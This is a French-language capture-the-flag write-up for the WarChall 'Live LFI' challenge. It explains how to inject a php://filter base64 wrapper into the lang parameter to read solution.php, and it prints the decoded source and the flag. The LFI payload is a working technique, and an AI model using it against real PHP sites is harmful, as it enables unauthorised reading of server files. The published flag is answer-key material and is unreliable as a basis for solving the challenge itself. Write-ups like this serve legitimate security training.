# Live LFI
Cette fois Live LFI Local File Inclusion, il y a des méthodes d'attaque de base NULL Byte Injection et path,
mais parmi les attaques appliquées, il y a une méthode d'attaque utilisant PHP Wrapper. Dans le cas de Warchall : Live LFI,
vous pouvez utiliser PHP Wrapper pour accéder au fichier en utilisant php://filter/convert.base64-encode/resource=solution.php

Le code "php://filter/convert.base64-encode/resource=solution.php" est une fonctionnalité de PHP qui permet de lire le contenu d'un fichier et de le convertir en base64.
Cela signifie que le contenu du fichier **solution.php** sera encodé en base64 avant d'être retourné.

En d'autres termes, si ce code est utilisé dans un contexte où une URL ou un chemin de fichier est attendu,
il peut être utilisé pour lire le contenu du fichier "solution.php" et le retourner sous forme encodée en base64.
Cela peut être utilisé pour contourner certaines restrictions d'accès aux fichiers ou pour manipuler le contenu des fichiers de manière non autorisée.

Etape à suivre : 
1. Allez dans le lien LFI (Local File Inclusion) principale => [LFI](https://lfi.warchall.net/)

2. Cliquer sur le logo de langue (choix de langue) => exemple : [LFI (langue)](https://lfi.warchall.net/index.php?lang=en)
3. Effacer *en* et *remplacer* par la methode d'attaque PHP Wrapper => (https://lfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=solution.php)
4. après, il donne des plusieur code à decoder : **PGh0bWw+Cjxib2R5Pgo8cHJlIHN0eWxlPSJjb2xvcjojMDAwOyI+dGVoIGZhbGcgc2kgbmFlciE8L3ByZT4KPHByZSBzdHlsZT0iY29sb3I6I2ZmZjsiPnRoZSBmbGFnIGlzIG5lYXIhPC9wcmU+CjwvYm9keT4KPC9odG1sPgo8P3BocCAgICAgICAgICAgICAgICAgICMgICBZT1VSX1RST1BIWSAKcmV0dXJuICdTdGVwcGluU3RvbmVzNDJQaWUnOyAjIDwtwrQgPz4K**
5. Après decodage enligne sur [base64decode](https://www.base64decode.org/) 
__Le resultat est là__ : 
````sh<html>
<body>
<pre style="color:#000;">teh falg si naer!</pre>
<pre style="color:#fff;">the flag is near!</pre>
</body>
</html>
<?php                  #   YOUR_TROPHY 
return 'SteppinStones42Pie'; # <-´ ?>
````
 Solution : **SteppinStones42Pie**


